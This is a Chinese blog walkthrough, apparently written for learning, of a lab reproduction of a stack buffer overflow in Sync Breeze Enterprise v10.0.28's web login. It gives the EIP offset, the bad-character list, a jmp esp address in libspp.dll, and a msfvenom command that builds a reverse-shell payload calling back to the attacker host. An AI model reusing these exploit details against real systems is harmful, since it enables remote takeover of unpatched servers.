#  思路清晰，我是菜B，8小时爆肝windows 32位syncbreeze缓冲区溢出漏洞复现   
原创 泷羽Sec-朝阳  泷羽Sec-朝阳   2025-05-09 12:26  
  
# 一、准备工作  
  
1、windows10 32位虚拟机作为目标靶机、kali作为攻击机 2、Immunity Debugger调试工具+mona脚本、存在漏洞版本的软件Sync Breeze Enterprise v10.0.28 3、syncbreeze 安装完后打开web服务，漏洞点在web服务上  
# 二、登陆页面  
## 1、寻找偏移量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibyjpzibsXHp9icP3bxj3H7cDdIXxBl6Dbd0L5E9BjwAyetCrhXzsOibIpA/640?wx_fmt=png&from=appmsg "")  
这里一个登录页面，这里F12修改一下输入限制长度  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibTTWryKaNYK1SmVXUDHxUWvyXr6ibXMHJrTUWsWk1VBoUcIibBbpQthoA/640?wx_fmt=png&from=appmsg "")  
然后这里生成800个A的脏数据，我们输入一下尝试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibjPcvDuf4VaPQ5DWicmRnprO3030gYYklb9hJzjdu5zvcA7XgcBhuxyw/640?wx_fmt=png&from=appmsg "")  
ok，这里输入了800个A发生报错，程序崩溃  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYib7t4IfOgpDENKXxZLa9DjyvYlgHic1mdUEmibj6Dsa70kIL7eIcUoicmAg/640?wx_fmt=png&from=appmsg "")  
这里我们重启服务，因为输入了超过限制的字符导致服务宕掉了![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibWUByBCqVt8icibAyp6vOIebL5on6m7kCWIO7jzeykRYuo6vv9zhhcn4w/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibiaF9HpmCMUNPc1qxW6wso9QUvHqWicKQcbzcZqBibsIvaAnlQoC1hdiccQ/640?wx_fmt=png&from=appmsg "")  
当我们向我们的网页发送了800个A发现程序崩掉了，并且程序都覆盖了A![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYib7qh8zUkvThXfG1yw9r1BTPnNomQGOKQ5YTDlpR2aUboPfDqjgoLe6Q/640?wx_fmt=png&from=appmsg "")  
这里EIP也被覆盖了，那我们想方法找到EIP的地址，这里可以使用注入一串不重复的字符串，这样就能确定我们的EIP位置了d![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibU0h3lja3BERKnmgmXYoLCtEU6CpF1dhjw3vTYCOkzOmlCViaSFRGtuQ/640?wx_fmt=png&from=appmsg "")  
这里丢一段脏数据，我们再来观察一下EIP的数据是什么 然后接下来我们查找偏移量，使用msf查询一下 msf-pattern_offset -l 800 -q 42306142![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibGSxZyicbl6JicjQicz2bpyA0Mf25hNeWyKYy6j5d16hkfQtNFZXTGQXlg/640?wx_fmt=png&from=appmsg "")  
那么这里偏移量为780，那么我们的第781-784四个字节就会被写入到EIP寄存器里面，我们验证一下  
## 2、验证偏移量  
  
那么我们把前780个字符写为A，781-784写成B，后面再写成C来验证我们是否找到了正确的偏移量  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibEDpOfWhWoW8u1v6qVicMbQKia3YEt47ZcEs94RZGY292KIj4uibZj9z2Q/640?wx_fmt=png&from=appmsg "")  
这样我们就验证成功了，42424242也就是四个B的意思，那我们EIP的返回地址就是780-784![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYib6Y6Bllp6hU7sastEMDk5JHR7iaUu8lgxibOsqhhRmibRl1IASkcEmMoww/640?wx_fmt=png&from=appmsg "")  
也就是对应的这个位置  
## 3、测试可写入字符量  
  
这里我们插入1500个字符来测试一下，1减去我们之前的780个A，4个B，四个C，哪减去的剩下的就是我们可以写入的字符数量![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibrpc0Zl6YutkL44gic3bgNxEkZMjXMvyxibmHygb4iaAWpeaeqhHDjY0BQ/640?wx_fmt=png&from=appmsg "")  
从这里开始0076744c-00767710这就是我们可插入的字符，也就是这些空间可以让我们写shell![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibmQc9dNyCPPibKFW4hmEH3gmN98aAicTModiazgI3qXggLvZ07SzeprYrA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibtUYloiayqmbNhicUVDGCOV6YEZhjPRtBGlaYhDbzKuEgxhwVvCfP4iaBQ/640?wx_fmt=png&from=appmsg "")  
## 4、测试坏字符  
  
这是所有坏字符，诶个尝试  
```
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```  
## 5、寻找 jmp esp指令的内存地址  
  
利用EIP返回，指向一个固定不变的地址，就是栈顶，找jmp esp jmp：是“Jump”的缩写，意为“跳转”。这个指令会导致程序的执行流跳转到指定的地址。 esp：指的是ESP寄存器的值，它当前指向堆栈的顶部。  
  
在kali 利用msf-nasm_shell转换jmp esp成16进制操作数 msf-nasm_shell jmp esp jmp esp的十六进制：FFE4![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibNJXd5NI2V2F9F51qAiaqUzL1FuATBuYzMByum5dSABZWBiapGjzlzg9Q/640?wx_fmt=png&from=appmsg "")  
然后运用一个mona插件,先列出加载到所有模块 !mona modules 然后我们找到一个安全性比较低的命令，并寻找有没有jmp esp这条指令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibveU2KY4DAYlkQ9dsLZVwnF6C5ZnPHYG9FEMmT4cD3wbrSOIzMuDBHw/640?wx_fmt=png&from=appmsg "")  
这个程序发现安全性很低，libspp.dll动态链接库没有启用安全机制![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibBMFvDPOeXvhFO05HSqO6PILEYicvy5ibibIeLY8qwWKBOumjhQNTA6Gog/640?wx_fmt=png&from=appmsg "")  
接下来我们来查找一下这个程序地址![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibIx8juuRSaRKVKDRWPYTqpJbn88BwhCHrEiaak2DdBxicTarhLv1NkurQ/640?wx_fmt=png&from=appmsg "")  
这里发现这个程序有这条命令，那么我们复制一下地址0x10090c83，然后我们搜索该地址  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibibZGRqp5t1ib7Tia7o2LXy7738wYQuSG0aqTWsbh3ozOABK6VVb9g0hWw/640?wx_fmt=png&from=appmsg "")  
找到了，是一个FFE4的jmp esp，并且把他的地址转化为16进制\x83\x0c\x09\x10也就是这样的形式  
## 6、shell反连  
  
反弹shell kali使用msf生成反弹shell 使用-b参数过滤掉坏字符  
  
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.66.129 LPORT=8888 -f c -b "\x00\x0A\x0D\x25\x26\x2B\x3D" EXITFUNC=thread  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibaEkCU8z0hxKWKAGdERIcoaCicpMrqsX8BkaK0k8ibkEMria8X75SNQiagA/640?wx_fmt=png&from=appmsg "")  
然后我们生成这样一个反连shell的脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT29picH7ciaUFVnUF6TvAyAYibiadSia686lMJszsxYgH6Q0iaXX7fkicTjDpa82qwg1N1OnuermX6fu2kpQ/640?wx_fmt=png&from=appmsg "")  
拿下了，这东西太恶心了，做了一下午，跑步去了兄弟们  
  
  
